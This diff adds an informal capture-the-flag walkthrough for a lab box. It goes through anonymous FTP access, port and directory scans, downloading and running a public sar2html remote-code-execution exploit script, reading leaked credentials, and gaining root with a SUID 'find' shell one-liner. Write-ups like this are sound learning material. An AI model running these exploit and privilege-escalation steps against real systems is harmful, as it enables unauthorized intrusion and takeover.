@@ -1,0 +1,169 @@
+found out the ftp was anonymous access
+logged in into it with username : anonymous and no password
+
+ls -la
+
+file name : .info.txt
+
+downloaded it into my pc using get .into.txt
+
+cat .info.txt
+
+Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
+
+this is rot13
+
+https://www.rot13.com
+
+Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
+
+
+this tiime i though to use rustscan with nmap like this
+
+
+rustscan -a 10.10.25.128 -- -sV -sC
+
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.10.25.128:21
+Open 10.10.25.128:80
+Open 10.10.25.128:10000
+Open 10.10.25.128:55007
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 12:14 IST
+
+PORT      STATE SERVICE REASON  VERSION
+21/tcp    open  ftp     syn-ack vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.17.12.104
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
+|_http-favicon: Unknown favicon MD5: 466D7406978DC4B937C9E66A8B564215
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: MiniServ/1.930
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+55007/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
+|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
+|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+So first i decided to enumerate port 80
+visited that and saw robots.txt was having some encrypted thing in the end
+
+
+/tmp
+/.ssh
+/yellow
+/not
+/a+rabbit
+/hole
+/or
+/is
+/it
+079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
+
+
+i started a gobuster scan on port 80 and got these results
+
+gobuster dir  -u http://10.10.25.128 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,html -t 100 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.25.128
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,php,html
+[+] Timeout:                 10s
+===============================================================
+2021/07/07 12:36:51 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 11321]
+/manual               (Status: 301) [Size: 313] [--> http://10.10.25.128/manual/]
+/robots.txt           (Status: 200) [Size: 257]                                  
+/joomla               (Status: 301) [Size: 313] [--> http://10.10.25.128/joomla/]
+
+
+did a scan in joomla directory
+
+and found some of the dir like /_files /_archive /_database and there was nothing but only some base64 encoded things which were of no use
+Lwuv oguukpi ctqwpf.
+V2hvcHNpZSBkYWlzeQo=
+
+
+in the end i used common.txt from seclist to scan the dir and found /_test dir
+
+$gobuster dir  -u http://10.10.25.128/joomla/ -w common.txt -x txt,php,html -t 100 
+
+
+visited there and found sar2html thing
+i looked for sar2html what is this thing and found out that this can be vulnerable to rce
+
+just googled a bit and found this intresting github repo for rce
+
+https://raw.githubusercontent.com/musyoka101/sar2html-Remote-Code-Execution/fa2336b1567bf16979bde2107e624f4589695462/exploit.py
+
+downloaded this by
+wget $url
+
+and changed the permissions 
+chmod +x exploit.py
+
+python3 exploit.py
+
+enter the full url
+http://10.10.25.128/joomla/_test/
+
+and the commands! boom
+
+ls in the directory and you will see a log.txt file in the dir
+
+cat that out
+
+cat log.txt
+
+you will get some credentials for a user use ssh to login into that user
+
+in this case use -p 55007 as ssh is enabled on this port
+
+ssh basterd@ip -p 55007
+
+did sudo -l but it was not allowed after that! i though of looking for suid files and damm!! /usr/bin/find was having suid enabled and i know find can be used to escalate priv when suid enabled went to gtfo bins and the command was
+
+find . -exec /bin/sh -p \; -quit
+
+you are root now!
+
+for flags see the backup.sh file there you will find the password for stoner user
+login into that user
+and ls -la
+
+you will see a file named .secret there is the user flag and root flag is in the root directory
